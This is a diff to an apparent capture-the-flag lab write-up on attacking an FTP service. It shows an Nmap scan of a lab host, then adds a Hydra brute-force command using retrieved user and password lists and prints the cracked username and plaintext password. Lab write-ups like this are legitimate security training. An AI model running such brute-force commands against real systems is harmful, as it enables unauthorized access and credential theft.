@@ -16,6 +16,7 @@ As we move forward in this field, we will need to get familiar with common servi
 # Questions and Answers 
 ## Attacking FTP
 * **What port is the FTP service running on?**
+  
 An initial Nmap scan was conducted using the following command: 
 ```bash
 nmap -sC -sV --top-ports 1000 10.129.203.6
@@ -44,3 +45,11 @@ Then I proceeded to enumerate and download files from the FTP server.
 [![Screenshot-2025-02-25-120041.png](https://i.postimg.cc/sDqH4Zmm/Screenshot-2025-02-25-120041.png)](https://postimg.cc/Whm72zQq)
 
 
+After retrieving users.list and passwords.list from the FTP server, I performed a brute-force attack using Hydra:
+```bash
+hydra -L users.list -P passwords.list ftp://10.129.203.6:2121 -T 60
+```
+After executing the Hydra brute-force attack, the following valid FTP credentials were obtained:
+
+* **Username:** robin
+* **Password:** 7iz4rnckjsduza7
